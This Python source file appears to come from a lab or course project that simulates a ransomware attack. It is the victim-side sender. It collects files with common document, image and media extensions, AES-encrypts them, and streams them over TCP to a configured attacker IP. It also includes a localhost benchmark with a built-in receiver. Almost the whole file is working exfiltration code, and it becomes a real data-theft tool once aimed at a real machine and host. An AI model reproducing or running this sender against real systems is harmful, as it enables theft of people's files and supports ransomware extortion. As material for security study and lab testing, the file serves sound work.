"""
victim/transfer_sender.py  —  Person 1
Victim-side sender for the encrypted exfiltration channel.

Scans config.TEST_DATA_DIR for targeted file extensions, AES-encrypts each
file in memory, and streams it over a TCP socket to the attacker's
transfer_receiver.py using a simple per-file binary header.

Wire Protocol (per file)
-------------------------
    [4B  filename_len  BE uint32 ]
    [N   filename  utf-8         ]
    [8B  filesize   BE uint64    ]   (size of *encrypted* payload)
    [16B IV                      ]
    [32B AES session key         ]   (same key for encrypt/decrypt on both ends)
    [<filesize> encrypted bytes  ]

End-of-session sentinel: a 4-byte zero (filename_len == 0).

The exfiltration AES key is derived fresh per session and sent inline with each
file header so the receiver can decrypt without prior key exchange (suitable for
the exfiltration path). This is intentionally distinct from the RSA-wrapped
per-file key used in the local ransomware encryption path.

Benchmark output (Module 1B Step 5)
-------------------------------------
Running with --benchmark produces results/transfer_benchmarks.json:
    {
      "meta": {"mode": "loopback", "timestamp": "..."},
      "files": [
        {
          "filename": "sample_text.txt",  "media_type": "text",
          "size_mb": 0.05,  "time_s": 0.003,  "throughput_mbps": 16.7,
          "plaintext_bytes": 50000,  "encrypted_bytes": 50016
        }, ...
      ]
    }

Log format: JSON-lines → logs/transfer.log
    {"ts": "...", "module": "transfer", "event": "file_sent", ...}
"""

import sys
import os
import socket
import struct
import json
import time
import logging
import threading
import tempfile
from datetime import datetime, timezone
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import config
from shared.crypto import aes_encrypt, generate_aes_key, generate_iv


# ──────────────────────────────────────────────────────────────────────────────
# Targeted file extensions (FR-4.3)
# ──────────────────────────────────────────────────────────────────────────────

TARGET_EXTENSIONS = {".docx", ".xlsx", ".pdf", ".jpg", ".mp3", ".mp4", ".txt", ".png"}

# Skip honeypot directory — exfiltration should NOT touch decoys during testing
HONEYPOT_DIR_RESOLVED = Path(config.HONEYPOT_DIR).resolve()


# ──────────────────────────────────────────────────────────────────────────────
# Logging
# ──────────────────────────────────────────────────────────────────────────────

def _setup_logger(log_dir: str) -> logging.Logger:
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    log_path = Path(log_dir) / "transfer.log"
    logger = logging.getLogger("transfer_sender")
    logger.setLevel(logging.DEBUG)
    if not logger.handlers:
        fh = logging.FileHandler(log_path)
        fh.setFormatter(logging.Formatter("%(message)s"))
        logger.addHandler(fh)
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(logging.Formatter("[transfer_sender] %(message)s"))
        logger.addHandler(sh)
    return logger


def _log(logger: logging.Logger, event: str, **extra) -> None:
    record = {
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "module": "transfer",
        "side": "victim",
        "event": event,
        **extra,
    }
    logger.info(json.dumps(record))


# ──────────────────────────────────────────────────────────────────────────────
# File discovery
# ──────────────────────────────────────────────────────────────────────────────

def _collect_targets(base_dir: str) -> list[Path]:
    """
    Walk *base_dir* alphabetically and return paths matching TARGET_EXTENSIONS.

    Honeypot directory is explicitly skipped so decoy files are never exfiltrated.
    Encrypted (.locked) files are also skipped.
    """
    targets: list[Path] = []
    for dirpath, dirnames, filenames in os.walk(base_dir):
        # Skip honeypot
        dirnames[:] = sorted(dirnames)  # alphabetical traversal
        p = Path(dirpath).resolve()
        if p == HONEYPOT_DIR_RESOLVED or HONEYPOT_DIR_RESOLVED in p.parents:
            continue

        for fname in sorted(filenames):
            fp = p / fname
            if fp.suffix.lower() in TARGET_EXTENSIONS and not fp.name.endswith(config.ENCRYPTED_EXT):
                targets.append(fp)

    return targets


# ──────────────────────────────────────────────────────────────────────────────
# Per-file send
# ──────────────────────────────────────────────────────────────────────────────

def _send_file(
    sock: socket.socket,
    file_path: Path,
    logger: logging.Logger,
    results: list,
) -> None:
    """
    Encrypt and stream one file over *sock* using the wire protocol.

    A fresh AES-256 session key and IV are generated per file so even
    if one file's key is compromised, the others remain secure.
    """
    aes_key = generate_aes_key()
    iv      = generate_iv()

    t_start = time.perf_counter()

    with open(file_path, "rb") as fh:
        plaintext = fh.read()

    ciphertext  = aes_encrypt(plaintext, iv, aes_key)
    fname_bytes = file_path.name.encode("utf-8")
    payload_len = len(ciphertext)

    # ── Build and send header ────────────────────────────────────────────────
    header = struct.pack(">I", len(fname_bytes))  # 4B filename length
    header += fname_bytes                          # filename bytes
    header += struct.pack(">Q", payload_len)       # 8B payload size
    header += iv                                   # 16B IV
    header += aes_key                              # 32B AES key

    sock.sendall(header)
    sock.sendall(ciphertext)

    elapsed_ms = (time.perf_counter() - t_start) * 1000
    size_mb    = len(plaintext) / 1_000_000
    throughput = size_mb / (elapsed_ms / 1000) if elapsed_ms > 0 else 0.0

    _log(
        logger,
        "file_sent",
        filename=file_path.name,
        plaintext_bytes=len(plaintext),
        encrypted_bytes=payload_len,
        elapsed_ms=round(elapsed_ms, 2),
        throughput_mbps=round(throughput, 4),
    )
    print(
        f"[transfer_sender] ↑ {file_path.name}  "
        f"({len(plaintext):,} B  {throughput:.2f} MB/s)"
    )

    results.append({
        "filename": file_path.name,
        "media_type": file_path.suffix.lstrip("."),
        "size_mb": round(len(plaintext) / 1_048_576, 4),
        "time_s": round(elapsed_ms / 1000, 6),
        "throughput_mbps": round(throughput, 4),
        "plaintext_bytes": len(plaintext),
        "encrypted_bytes": payload_len,
        "elapsed_ms": round(elapsed_ms, 2),
    })


def _send_sentinel(sock: socket.socket) -> None:
    """Send the 4-byte zero sentinel signalling end of transfer."""
    sock.sendall(struct.pack(">I", 0))


# ──────────────────────────────────────────────────────────────────────────────
# Public entry points
# ──────────────────────────────────────────────────────────────────────────────

def run_sender(
    attacker_ip: str = config.ATTACKER_IP,
    port: int = config.TRANSFER_PORT,
    data_dir: str = config.TEST_DATA_DIR,
    log_dir: str = config.LOG_DIR,
    benchmark_path: str | None = None,
) -> None:
    """
    Discover targeted files in *data_dir*, connect to the attacker receiver,
    and stream all files in alphabetical order.

    Parameters
    ----------
    attacker_ip    : str — attacker VM IP (config.ATTACKER_IP)
    port           : int — transfer port (config.TRANSFER_PORT)
    data_dir       : str — root of the military data directory
    log_dir        : str — directory for transfer.log
    benchmark_path : str — optional: path to save per-file benchmark JSON
                          (default: results/transfer_benchmarks.json)
    """
    logger = _setup_logger(log_dir)
    # ── Canonical output path — matches what receiver also produces ───────────
    bench  = benchmark_path or str(Path(config.RESULTS_DIR) / "transfer_benchmarks.json")

    targets = _collect_targets(data_dir)
    if not targets:
        _log(logger, "no_targets_found", data_dir=data_dir)
        print(f"[transfer_sender] No target files found in {data_dir}")
        return

    _log(logger, "exfil_starting", target_count=len(targets), attacker_ip=attacker_ip, port=port)
    print(f"[transfer_sender] {len(targets)} file(s) to exfiltrate → {attacker_ip}:{port}")

    results: list = []

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((attacker_ip, port))
            _log(logger, "connected", attacker_ip=attacker_ip, port=port)

            for fp in targets:
                _send_file(sock, fp, logger, results)

            _send_sentinel(sock)
            _log(logger, "sentinel_sent")

    except Exception as exc:
        _log(logger, "exfil_error", error=str(exc))
        print(f"[transfer_sender] ERROR: {exc}")
    finally:
        _log(logger, "exfil_complete", files_sent=len(results))
        _save_benchmarks(results, bench, mode="live")


def _save_benchmarks(results: list, bench_path: str, mode: str = "live") -> None:
    """Write benchmark results to *bench_path* in the canonical schema."""
    if not results:
        return
    output = {
        "meta": {
            "mode": mode,
            "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
            "total_files": len(results),
            "note": "loopback = localhost test; live = real VM transfer",
        },
        "files": results,
    }
    Path(bench_path).parent.mkdir(parents=True, exist_ok=True)
    with open(bench_path, "w") as fh:
        json.dump(output, fh, indent=2)
    print(f"[transfer_sender] Benchmarks → {bench_path}")


# ──────────────────────────────────────────────────────────────────────────────
# Loopback benchmark — Module 1B Step 5
# Generates results/transfer_benchmarks.json without real VMs.
# Uses a minimal in-process receiver thread on localhost:TRANSFER_PORT.
# ──────────────────────────────────────────────────────────────────────────────

def _minimal_receiver_thread(port: int, output_dir: Path, ready_event: threading.Event) -> None:
    """Bare-bones receiver that decrypts and saves files; runs in a daemon thread."""
    from shared.crypto import aes_decrypt

    def _recv_exact(s, n):
        buf = b""
        while len(buf) < n:
            chunk = s.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("socket closed prematurely")
            buf += chunk
        return buf

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", port))
        srv.listen(1)
        ready_event.set()  # signal that we're listening
        srv.settimeout(15)
        try:
            conn, _ = srv.accept()
            with conn:
                while True:
                    raw_len = _recv_exact(conn, 4)
                    fname_len = struct.unpack(">I", raw_len)[0]
                    if fname_len == 0:
                        break
                    filename  = _recv_exact(conn, fname_len).decode("utf-8")
                    filesize  = struct.unpack(">Q", _recv_exact(conn, 8))[0]
                    iv        = _recv_exact(conn, 16)
                    aes_key   = _recv_exact(conn, 32)
                    ciphertext = _recv_exact(conn, filesize)
                    plaintext  = aes_decrypt(ciphertext, iv, aes_key)
                    out = output_dir / Path(filename).name
                    out.write_bytes(plaintext)
        except socket.timeout:
            pass


SAMPLE_MEDIA_SIZES = {
    # label: (extension, approx_size_bytes)
    "text":  (".txt",  50_000),
    "image": (".jpg",  500_000),
    "audio": (".mp3",  2_000_000),
    "video": (".mp4",  10_000_000),
}


def local_loopback_benchmark(
    bench_path: str | None = None,
    log_dir: str = config.LOG_DIR,
    port: int = config.TRANSFER_PORT,
) -> None:
    """
    Module 1B Step 5 — Generate results/transfer_benchmarks.json on localhost.

    Creates synthetic sample files for all four media types, spins up a minimal
    receiver thread on 127.0.0.1, sends every file through the full wire protocol
    (AES encrypt → header → stream → AES decrypt → verify), records per-file timing,
    and writes results/transfer_benchmarks.json.

    Run:
        python3 victim/transfer_sender.py --benchmark

    Parameters
    ----------
    bench_path : str  — output JSON path (default: results/transfer_benchmarks.json)
    log_dir    : str  — log directory
    port       : int  — loopback port (default: config.TRANSFER_PORT)
    """
    logger = _setup_logger(log_dir)
    bench  = bench_path or str(Path(config.RESULTS_DIR) / "transfer_benchmarks.json")

    print("\n[transfer_sender] ── Loopback Benchmark (Module 1B Step 5) ──")
    _log(logger, "benchmark_starting", mode="loopback", port=port)

    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        sample_dir  = tmpdir / "samples"
        receive_dir = tmpdir / "received"
        sample_dir.mkdir()
        receive_dir.mkdir()

        # ── Generate synthetic sample files ───────────────────────────────────
        sample_files: list[Path] = []
        for label, (ext, size) in SAMPLE_MEDIA_SIZES.items():
            fp = sample_dir / f"sample_{label}{ext}"
            # Use repeating ASCII for text; random bytes for binary types
            if label == "text":
                fp.write_bytes(("OPERATION EAGLE\nClassification: FICTIONAL\n" * (size // 40 + 1))[:size].encode())
            else:
                fp.write_bytes(os.urandom(size))
            sample_files.append(fp)
            print(f"  Generated {label:6s}  {fp.name}  ({size:>10,} B)")

        # ── Start minimal receiver in background thread ───────────────────────
        ready = threading.Event()
        t = threading.Thread(
            target=_minimal_receiver_thread,
            args=(port, receive_dir, ready),
            daemon=True,
        )
        t.start()
        ready.wait(timeout=5)
        print(f"  Receiver listening on 127.0.0.1:{port}")

        # ── Send all files and measure timing ─────────────────────────────────
        results: list = []
        print()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect(("127.0.0.1", port))
                _log(logger, "connected", attacker_ip="127.0.0.1", port=port)

                for fp in sample_files:
                    _send_file(sock, fp, logger, results)

                _send_sentinel(sock)

        except Exception as exc:
            _log(logger, "benchmark_error", error=str(exc))
            print(f"[transfer_sender] ERROR during benchmark: {exc}")
            return

        t.join(timeout=10)

        # ── Verify byte-for-byte recovery ─────────────────────────────────────
        print()
        all_ok = True
        for fp in sample_files:
            recv_path = receive_dir / fp.name
            if recv_path.exists() and recv_path.read_bytes() == fp.read_bytes():
                print(f"  ✓ {fp.name}  → byte-for-byte verified")
            else:
                print(f"  ✗ {fp.name}  → MISMATCH or missing!")
                all_ok = False

        # ── Print summary table ───────────────────────────────────────────────
        print()
        print(f"  {'File':<30} {'Size MB':>8} {'Time s':>8} {'MB/s':>8}")
        print(f"  {'-'*30} {'-'*8} {'-'*8} {'-'*8}")
        for r in results:
            print(
                f"  {r['filename']:<30} "
                f"{r['size_mb']:>8.3f} "
                f"{r['time_s']:>8.4f} "
                f"{r['throughput_mbps']:>8.2f}"
            )

        _save_benchmarks(results, bench, mode="loopback")
        _log(logger, "benchmark_complete", files=len(results), verified=all_ok,
             output=bench)

        if all_ok:
            print("\n[transfer_sender] All files verified ✓ — benchmarks saved.")
        else:
            print("\n[transfer_sender] WARNING: some files failed verification!")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Transfer Sender — Person 1")
    parser.add_argument(
        "--benchmark",
        action="store_true",
        help="Run Module 1B Step 5 loopback benchmark and save results/transfer_benchmarks.json",
    )
    args = parser.parse_args()
    if args.benchmark:
        local_loopback_benchmark()
    else:
        run_sender()
